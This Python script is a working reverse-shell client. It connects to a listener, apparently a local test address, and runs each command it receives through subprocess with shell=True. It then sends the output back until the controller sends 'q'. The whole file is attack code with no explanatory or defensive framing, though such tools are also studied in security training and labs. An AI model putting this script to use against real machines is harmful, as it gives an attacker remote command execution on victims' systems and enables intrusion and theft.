#!/usr/bin/python

import socket
import subprocess
import json

def big_send(data):
	json_data = json.dumps(data)
	s.send(json_data)

def big_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + s.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue
def Estconnection():
	global s
	#creating socket and setting up options 
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

	s.connect(("127.0.0.1",44443))
	print("Connection Established !!")

def Execute_cmd():
	while True:	
		cmd = big_recv()
		if cmd == "q" :
			print("Terminating Connection from client......")
			break	
		else:
			try:
				proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				print(result)
				big_send(result)
			except:
				print("Command can't execute!!!")
				continue
Estconnection()
Execute_cmd()
s.close()
